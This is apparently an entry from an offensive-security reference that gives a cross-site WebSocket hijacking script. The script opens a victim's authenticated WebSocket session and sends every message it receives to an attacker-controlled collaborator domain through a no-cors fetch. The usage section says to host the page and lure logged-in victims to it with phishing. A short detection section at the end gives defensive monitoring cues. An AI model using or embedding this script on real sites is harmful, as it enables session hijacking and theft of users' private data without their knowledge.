---
id: d122d13e-f0a2-47d8-89cf-be2c9881fd63
type: code
language: javascript
verified: true
created_at: '2020-08-22T13:07:06.695938+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - websocket-hijacking
  - exfiltration
  - javascript
validated: true
---

# JavaScript-WebSocket-Hijacking-Exfiltration

## Code

```javascript
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY");
}
function handleReply(event) {
  fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```

## Description

This JavaScript code creates a malicious webpage that hijacks a victim's WebSocket session by connecting to the target application's WebSocket endpoint using the browser's existing cookies. Upon connection, it sends a 'READY' command to retrieve data (e.g., chat history), then exfiltrates each received message via a no-cors fetch request to an attacker-controlled domain. It exploits the lack of CSRF protection in the WebSocket handshake.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| your-websocket-URL | The target WebSocket endpoint URL from the application's handshake | wss://chat.example.com/ws |
| your-collaborator-domain | Attacker's domain for receiving exfiltrated data (e.g., Burp Collaborator) | abc123.oastify.com |

## Usage

Embed this script in an HTML file and host it on a server under attacker control. Deliver the URL to the victim via phishing or social engineering while they are authenticated to the target site. The victim's browser will use their session cookies to authenticate the WebSocket, allowing data theft. Used in procedures like [[procedures/Cross-Site-WebSocket-Hijacking]] for session impersonation and data exfiltration.

## Detection

- Monitor client-side JavaScript for unauthorized WebSocket creations and fetch requests to external domains
- WebSocket server logs for connections from unexpected origins or rapid 'READY' commands
- Network traffic analysis for no-cors fetches to suspicious domains (e.g., collaborator-like subdomains)
- Browser developer tools or endpoint protection to flag cross-origin WebSocket initiations without CSRF tokens

## Related

- [[procedures/Cross-Site-WebSocket-Hijacking]]
- [[tools/Burp-Suite]]
